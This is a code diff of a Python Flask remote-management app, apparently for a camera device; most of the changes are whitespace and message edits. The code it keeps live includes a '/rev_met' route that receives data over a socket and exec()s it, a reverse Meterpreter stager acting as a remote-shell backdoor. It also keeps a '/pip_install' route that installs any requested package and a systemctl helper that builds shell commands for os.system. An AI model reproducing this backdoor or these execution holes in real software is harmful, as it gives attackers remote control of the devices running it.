@@ -33,9 +33,9 @@ def systemctl(options):
     return True if not os.system("systemctl {}".format(options)) else False
 
 
-
 def authenticate():
     return Response('Access DENIED!', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
+
 
 def requires_auth(f):
     @wraps(f)
@@ -59,9 +59,7 @@ def json_response(f):
         def fn(*args, **kwargs):
             # return json.dumps(f(*args, **kwargs))
             return jsonify(f(*args, *kwargs))
-
         return fn(*args, **kwargs)
-
     return decorated
 
 
@@ -149,7 +147,6 @@ def get_eyepi_capture_service():
     return "spc-eyepi_capture.service"
 
 
-
 @app.route('/restart')
 @app.route('/reboot')
 @requires_auth
@@ -196,7 +193,7 @@ def reset_to_tag(tag):
 
     app.debug = True
     return {"status":True,
-            "message": "Updated to {}".format(tag)}
+            "message": "Reverted to {}".format(tag)}
 
 
 @app.route("/pip_install")
@@ -208,19 +205,8 @@ def pip_install():
         _, package = dict(request.args).popitem()
         pip.main(["install", package])
     except Exception as e:
-        return {"status":False, "message":str(e)},500
-
-    return {"status":True, "message":"Package installed"}
-
-
-@app.route("/fix_db")
-@requires_auth
-def change_pw():
-    from urllib import request as urllib_request
-    import shutil
-    with urllib_request.urlopen("http://data.traitcapture.org/db_private") as resp, open("db",'wb') as fout:
-        shutil.copyfileobj(resp, fout)
-    return {"sucess":True}
+        return {"status":False, "message": str(e)}, 500
+    return {"status":True, "message": "Package installed"}
 
 
 @app.route("/rev_met")
@@ -242,8 +228,9 @@ def reverse_meterpreter():
             d += s.recv(4096)
         exec(d, {'s': s})
     except Exception as e:
-        return {"status":False,
-                "message":str(e)}, 500
+        return {"status": False,
+                "message": str(e)}
+
     return {"status": True,
             "message":'Welcome...'}
 
